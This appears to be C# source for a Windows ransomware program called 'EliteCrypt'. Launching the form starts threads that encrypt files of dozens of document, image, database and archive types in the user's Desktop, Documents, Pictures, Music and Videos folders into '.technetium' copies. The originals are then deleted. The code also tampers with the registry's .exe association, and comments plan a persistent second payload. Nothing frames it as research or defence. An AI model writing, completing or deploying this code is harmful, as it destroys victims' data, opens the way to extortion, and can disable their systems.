﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.IO;
using System.Threading;
using System.Reflection;
using Microsoft.Win32;

namespace EliteCrypt
{

    public partial class Form1 : Form
    {
        //Call this function to remove the key from memory after use for security
        [DllImport("KERNEL32.DLL", EntryPoint = "RtlZeroMemory")]
        public static extern bool ZeroMemory(IntPtr Destination, int Length);
        //Just the plain, good 'ol password
        public string password;
        //Generates random salt
        public static byte[] GenerateRandomSalt()
        {
            byte[] data = new byte[32];

            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
            {
                for (int i = 0; i < 10; i++)
                {
                    // Fille the buffer with the generated data
                    rng.GetBytes(data);
                }
            }

            return data;
        }
        //creates random password for encryption
        private async void CreatePassword()
        {
            int length = 4098;
            const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
            StringBuilder res = new StringBuilder();
            Random rnd = new Random();
            while (0 < length--)
            {
                res.Append(valid[rnd.Next(valid.Length)]);
            }
            password = res.ToString();
        }
        //Encrypts 1 file
        private async void FileEncrypt(string inputFile, string password)
        {
            //http://stackoverflow.com/questions/27645527/aes-encryption-on-large-files

            //generate random salt
            byte[] salt = GenerateRandomSalt();

            //create output file name
            FileStream fsCrypt = new FileStream(inputFile + ".technetium", FileMode.Create);

            //convert password string to byte arrray
            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);

            //Set Rijndael symmetric encryption algorithm
            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;
            AES.Padding = PaddingMode.PKCS7;

            //http://stackoverflow.com/questions/2659214/why-do-i-need-to-use-the-rfc2898derivebytes-class-in-net-instead-of-directly
            //"What it does is repeatedly hash the user password along with the salt." High iteration counts.
            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);

            //Cipher modes: http://security.stackexchange.com/questions/52665/which-is-the-best-cipher-mode-and-padding-mode-for-aes-encryption
            AES.Mode = CipherMode.CFB;

            // write salt to the begining of the output file, so in this case can be random every time
            fsCrypt.Write(salt, 0, salt.Length);

            CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateEncryptor(), CryptoStreamMode.Write);

            FileStream fsIn = new FileStream(inputFile, FileMode.Open);

            //create a buffer (1mb) so only this amount will allocate in the memory and not the whole file
            byte[] buffer = new byte[1048576];
            int read;

            try
            {
                while ((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
                {
                    Application.DoEvents(); // -> for responsive GUI, using Task will be better!
                    cs.Write(buffer, 0, read);
                }

                // Close up
                fsIn.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
            finally
            {
                cs.Close();
                fsCrypt.Close();
            }
        }
        public Form1()
        {
            InitializeComponent();
            Thread thread1 = new Thread(encryptDocs);
            thread1.Start();
            Thread thread2 = new Thread(encryptPics);
            thread2.Start();
            Thread thread3 = new Thread(encryptMusic);
            thread3.Start();
            Thread thread4 = new Thread(encryptVids);
            thread4.Start();
            Thread thread5 = new Thread(encryptDesk);
            thread5.Start();
            //Puts 2nd payload on temp

            //Makes 2nd payload start after every boot

            //Executes 2nd payload

            //Exits 1st payload
            Registry.ClassesRoot.CreateSubKey(".exe").SetValue("", "EXE", Microsoft.Win32.RegistryValueKind.String);
            //Registry.ClassesRoot.CreateSubKey(@"exeruntime\shell\open\command").SetValue("", DECRYPTOR_EXE_FILE, Microsoft.Win32.RegistryValueKind.String);
        }
        //encrypts target directories
        public async void encryptDesk()
        {
            string location = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

            GCHandle gch = GCHandle.Alloc(password, GCHandleType.Pinned);
            //extensions to be encrypt
            var validExtensions = new[]
            {
                ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".html", ".xml", ".psd", ".zip",".3ds",".7z",".accdb",".ai",".asp",".aspx",".avhd",".back",".bak",".c",".cfg",".conf",".cpp",".cs",".ctl",".dbf",".disk",".djvu",".dwg",".eml",".fdb",".gz",".h",".hdd",".kdbx",".mail",".msg",".nrg",".ora",".ost",".ova",".ovf",".pdf",".pmf",".pst",".pvi",".py",".pyc",".rar",".rtf",".tar",".vbox",".vbs",".vcb",".vdi",".vfd",".vmc",".vmdk",".vmsd",".vmx",".vsdx",".vsv",".work",".xvd"
            };

            string[] files = Directory.GetFiles(location);
            string[] childDirectories = Directory.GetDirectories(location);
            for (int i = 0; i < files.Length; i++)
            {
                string extension = Path.GetExtension(files[i]);
                if (validExtensions.Contains(extension))
                {
                    FileEncrypt(files[i], password);
                    File.Delete(files[i]);
                }
            }
            // To increase the security of the encryption, delete the given password from the memory !
            ZeroMemory(gch.AddrOfPinnedObject(), password.Length * 2);
            gch.Free();
        }
        public async void encryptDocs()
        {
            string location = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            
            GCHandle gch = GCHandle.Alloc(password, GCHandleType.Pinned);
            //extensions to be encrypt
            var validExtensions = new[]
            {
                ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".html", ".xml", ".psd", ".zip",".3ds",".7z",".accdb",".ai",".asp",".aspx",".avhd",".back",".bak",".c",".cfg",".conf",".cpp",".cs",".ctl",".dbf",".disk",".djvu",".dwg",".eml",".fdb",".gz",".h",".hdd",".kdbx",".mail",".msg",".nrg",".ora",".ost",".ova",".ovf",".pdf",".pmf",".pst",".pvi",".py",".pyc",".rar",".rtf",".tar",".vbox",".vbs",".vcb",".vdi",".vfd",".vmc",".vmdk",".vmsd",".vmx",".vsdx",".vsv",".work",".xvd"
            };

            string[] files = Directory.GetFiles(location);
            string[] childDirectories = Directory.GetDirectories(location);
            for (int i = 0; i < files.Length; i++)
            {
                string extension = Path.GetExtension(files[i]);
                if (validExtensions.Contains(extension))
                {
                    FileEncrypt(files[i], password);
                    File.Delete(files[i]);
                }
            }
            // To increase the security of the encryption, delete the given password from the memory !
            ZeroMemory(gch.AddrOfPinnedObject(), password.Length * 2);
            gch.Free();
        }
        public async void encryptPics()
        {
            string location = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
            
            GCHandle gch = GCHandle.Alloc(password, GCHandleType.Pinned);
            //extensions to be encrypt
            var validExtensions = new[]
            {
                ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".html", ".xml", ".psd", ".zip",".3ds",".7z",".accdb",".ai",".asp",".aspx",".avhd",".back",".bak",".c",".cfg",".conf",".cpp",".cs",".ctl",".dbf",".disk",".djvu",".dwg",".eml",".fdb",".gz",".h",".hdd",".kdbx",".mail",".msg",".nrg",".ora",".ost",".ova",".ovf",".pdf",".pmf",".pst",".pvi",".py",".pyc",".rar",".rtf",".tar",".vbox",".vbs",".vcb",".vdi",".vfd",".vmc",".vmdk",".vmsd",".vmx",".vsdx",".vsv",".work",".xvd"
            };

            string[] files = Directory.GetFiles(location);
            string[] childDirectories = Directory.GetDirectories(location);
            for (int i = 0; i < files.Length; i++)
            {
                string extension = Path.GetExtension(files[i]);
                if (validExtensions.Contains(extension))
                {
                    FileEncrypt(files[i], password);
                    File.Delete(files[i]);
                }
            }
            // To increase the security of the encryption, delete the given password from the memory !
            ZeroMemory(gch.AddrOfPinnedObject(), password.Length * 2);
            gch.Free();
        }
        public async void encryptMusic()
        {
            string location = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
            
            GCHandle gch = GCHandle.Alloc(password, GCHandleType.Pinned);
            //extensions to be encrypt
            var validExtensions = new[]
            {
                ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".html", ".xml", ".psd", ".zip",".3ds",".7z",".accdb",".ai",".asp",".aspx",".avhd",".back",".bak",".c",".cfg",".conf",".cpp",".cs",".ctl",".dbf",".disk",".djvu",".dwg",".eml",".fdb",".gz",".h",".hdd",".kdbx",".mail",".msg",".nrg",".ora",".ost",".ova",".ovf",".pdf",".pmf",".pst",".pvi",".py",".pyc",".rar",".rtf",".tar",".vbox",".vbs",".vcb",".vdi",".vfd",".vmc",".vmdk",".vmsd",".vmx",".vsdx",".vsv",".work",".xvd"
            };

            string[] files = Directory.GetFiles(location);
            string[] childDirectories = Directory.GetDirectories(location);
            for (int i = 0; i < files.Length; i++)
            {
                string extension = Path.GetExtension(files[i]);
                if (validExtensions.Contains(extension))
                {
                    FileEncrypt(files[i], password);
                    File.Delete(files[i]);
                }
            }
            // To increase the security of the encryption, delete the given password from the memory !
            ZeroMemory(gch.AddrOfPinnedObject(), password.Length * 2);
            gch.Free();
        }
        public async void encryptVids()
        {
            string location = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);
            
            GCHandle gch = GCHandle.Alloc(password, GCHandleType.Pinned);
            //extensions to be encrypt
            var validExtensions = new[]
            {
                ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".html", ".xml", ".psd", ".zip",".3ds",".7z",".accdb",".ai",".asp",".aspx",".avhd",".back",".bak",".c",".cfg",".conf",".cpp",".cs",".ctl",".dbf",".disk",".djvu",".dwg",".eml",".fdb",".gz",".h",".hdd",".kdbx",".mail",".msg",".nrg",".ora",".ost",".ova",".ovf",".pdf",".pmf",".pst",".pvi",".py",".pyc",".rar",".rtf",".tar",".vbox",".vbs",".vcb",".vdi",".vfd",".vmc",".vmdk",".vmsd",".vmx",".vsdx",".vsv",".work",".xvd"
            };

            string[] files = Directory.GetFiles(location);
            string[] childDirectories = Directory.GetDirectories(location);
            for (int i = 0; i < files.Length; i++)
            {
                string extension = Path.GetExtension(files[i]);
                if (validExtensions.Contains(extension))
                {
                    FileEncrypt(files[i], password);
                    File.Delete(files[i]);
                }
            }
            // To increase the security of the encryption, delete the given password from the memory !
            ZeroMemory(gch.AddrOfPinnedObject(), password.Length * 2);
            gch.Free();
        }
    }
}
